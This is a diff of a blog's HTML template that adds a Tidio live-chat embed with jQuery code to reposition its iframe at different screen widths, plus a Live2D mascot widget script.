@@ -1450,10 +1757,39 @@ $(function () {
     
 
     
+        <script src="//code.tidio.co/7sfvbaabl5mp7up6avakdatk7dbm4xow.js"></script>
+        <script>
+            $(document).ready(function () {
+                setInterval(change_Tidio, 50);
+                function change_Tidio() {
+                    var tidio=$("#tidio-chat iframe");
+                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
+                        document.getElementById("tidio-chat-iframe").style.right="-15px";
+                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
+                        document.getElementById("tidio-chat-iframe").style.right="-15px";
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
+                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
+                    }
+                }
+            });
+        </script>
+    
 
     
 
-	
+    <!--腾讯兔小巢-->
+    
     
 
     
@@ -1464,6 +1800,6 @@ $(function () {
     <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
 
-</body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 
 </html>
